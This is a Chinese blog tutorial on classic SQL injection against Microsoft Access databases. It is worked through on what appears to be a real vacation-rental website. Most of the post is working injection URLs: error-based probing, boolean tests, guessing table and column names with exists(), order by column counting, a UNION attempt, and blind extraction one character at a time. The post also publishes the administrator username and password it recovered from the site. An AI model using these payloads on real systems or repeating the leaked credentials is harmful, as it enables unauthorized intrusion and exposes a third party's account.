---
title: sql注入入门 之 access常规注入 [ union方式 ]
date: 2016-05-11 07:29:34
tags: sqlinjection
categories: "all sql injection"
---

<br>
0x01 用于演示的常规 access 实例注入点,如下,可以看到,正常情况下的页面是这样的:
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240
```
!["正常情况下的页面"](/img/access_1.jpg)<br>

0x02 尝试 `’` 干扰后,数据库如期报错,其实在错误里面就已经说的很清楚了,是access的数据库,错误的原因是多了个单引号导致的,既是如此,则证明我们的单引号刚刚已被带入了正常查询,这也正是我们想要看到的效果
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240'
```
!["数据库报错"](/img/access_2.jpg)<br>

0x03 再次确认是否真的存在注入,我们观察到,条件为真时页面返回正常
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and 1=1
```
!["条件为真返回正常"](/img/access_3.jpg)<br>

0x04 条件为假时页面返回错误,确认无疑,这是个标标准准的access数字型注入点,紧接着我们就可以开始正常查询各种数据了,关于注入access,暂时也看到没什么特别好的办法,表名字段名只能硬猜
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and 1=112
```
!["条件为假时返回错误"](/img/access_4.jpg)<br>

0x05 首先,尝试猜管理表名,当然,这中间肯定还尝试了很多其它可能的管理表名,比如,admin,login,admin_user等等……直到我们尝试到`users`表时页面才返回正常,说明该表存在
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and exists(select * from users)
```
!["猜管理表名"](/img/access_5.jpg)<br>

0x06 有了管理表名,接着就该猜该表中对应的用户和密码字段名了,当我们尝试 `username` 字段时,页面返回正常,说明该字段名存在
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and exists(select username from users)
```
!["猜账号字段名"](/img/access_6.jpg)<br>

0x07 用户名字段有了,下面该轮到猜密码字段名了,同样,当我们尝试 `password` 字段名时页面返回正常,说明该字段名也存在
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and exists(select password from users)
```
!["猜密码字段名"](/img/access_7.jpg)<br>

0x08 目前为止,表名,字段名都有了,理论上,紧接着直接去爆出相应的数据即可,不过,在爆数据之前,我们还需要先确定当前表的字段个数,后面好执行union,然后爆出数据的显示位,这里就用经典的order by ,很显然,为3的时候,页面返回正常
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 order by 3
```
!["字段为3的时候"](/img/access_8.jpg)<br>

0x09 为4的时候页面返回错误,按说,当前表的字段个数应该为3个才对
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 order by 4
```
!["字段为4的时候报错"](/img/access_9.jpg)<br>

0x10 但实际测试中,它却显示一直不匹配错误,好吧,想要直截了当的爆出数据估计要费点儿劲了,为了不在这里浪费时间,我们只能暂时用类似盲注的办法来一位位字符的截取数据了
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and 1=23 UNION SELECT 1,2,3 from users --
```
!["猜密码字段名"](/img/access_10.jpg)<br>

0x11 在这之前,我们已经确定了用户及密码的字段名和管理表名,所以,我们就可以像下面这样这样来获取数据<br>

0x12 查询 `username`字段下的第一条数据的长度,当大于7时页面返回正常
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and (select top 1 len(username) from users)>7 
```
!["字段数据长度"](/img/access_10.png)<br>

0x13 大于8时页面返回错误,说明 `username` 字段下的第一条数据长度为 8 个字符
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and (select top 1 len(username) from users)>8 
```
!["username字段第一条数据的长度"](/img/access_11.png)<br>

0x14 知道了第一条数据的总长度,我们就要可以开始一个一个字符的截取数据了,下面语句的意思是截取`username`字段的第一条数据的第一位字符并返回其对应的ascii码,可以看到,为98的时候页面返回正常,而98对应的ASCII码字符是`b`
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and (select top 1 asc(mid(username,1,1)) from users)=98
```
!["返回username字段第一条数据的第一个字符的ascii码值"](/img/access_12.png)<br>

0x15 截取`username`字段的第一条数据的第二个字符并返回其对应的ascii码,为119时页面返回正常,而119对应的字符为`w`
``` ruby
http://www.vlun.com/dauphin-island-vacation-rentals-details.asp?id=240 and (select top 1 asc(mid(username,2,1)) from users)=119
```
!["第二个字符的ASCII码值"](/img/access_13.png)<br>

最后,通过慢慢遍历,`username` 字段的第一条记录的完整数据为`bwrealty`<br>

0x16 `username`字段查完了,下面又该轮到`password`字段了,还是一模一样的方法

截取`password`字段的第一条数据的第一位字符,并返回其对应的ascii码,直到为98时页面猜返回正常
``` ruby
http://www.boardwalk-realty.com/dauphin-island-vacation-rentals-details.asp?id=240 and (select top 1 asc(mid(password,1,1)) from users)=98
```
!["第一个字符的ASCII码值"](/img/acpass1.png)<br>

截取password字段的第一条数据的第二位字符,并返回其对应的ascii码,直到为119时页面猜返回正常
``` ruby
http://www.boardwalk-realty.com/dauphin-island-vacation-rentals-details.asp?id=240 and (select top 1 asc(mid(password,2,1)) from users)=119
```
!["第二个字符的ASCII码值"](/img/acpass2.png)<br>

`password`字段第一条数据的最终结果为`bwrealty123`,至此,整个access的常规注入就算基本完成了,大家也都看到了,其实整个注入过程,非常的简单
<br>

一点小结:
&nbsp;&nbsp;&nbsp;&nbsp;针对access的注入,其实真的没什么特别需要注意的,非常简单,因为它没有像mysql,mssql,oracle...那样,直接有提供现成的元数据可以查,表名字段名都只能硬猜,也就是说,如果是字段名猜不着,有后台的情况下,还可以看看后台的登陆表单里的账号密码字段名是什么,然后拿这个来试试,如果压根是表名都猜不着也就猜不着了,没什么曲线可以走,所以,这就需要大家自己平时多去搜集一些命中率相对比较高的管理员表名和账户密码字段名了,另外,因为access数据库,本身就非常小,所以,根本也没有任何权限及用户访问控制机制,自然注入起来也非常的容易,基本上是不用考虑的太多,上手即来
<br>
